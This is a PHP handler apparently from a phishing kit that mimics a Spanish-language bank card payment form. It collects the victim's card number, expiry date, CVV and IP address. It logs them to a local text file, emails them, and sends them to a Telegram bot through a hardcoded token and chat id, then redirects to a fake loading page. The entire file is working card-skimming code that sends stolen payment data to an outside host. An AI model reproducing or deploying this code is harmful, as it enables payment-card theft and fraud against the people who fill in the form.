<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            SHANkS
            ---------------
            | CCN : " . $_POST['Sis_Numero_Tarjeta'] . "
            | EXP : " . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."|". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."
            | CVV : " . $_POST['Sis_Tarjeta_CVV2'] . "
            | INF : " . $ip . "
            ---------------\n";

            $file = fopen("./kICHTA.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (CCN|SAUDI)";
			$headers = "From: Ak47™<>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
            file_get_contents("https://api.telegram.org/bot5349378963:AAHhoaODBHchRHwTlA0Ado7L0kB-mN3GdSU/sendMessage?chat_id=-686751987&text=" . urlencode($message)."" );
		
        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>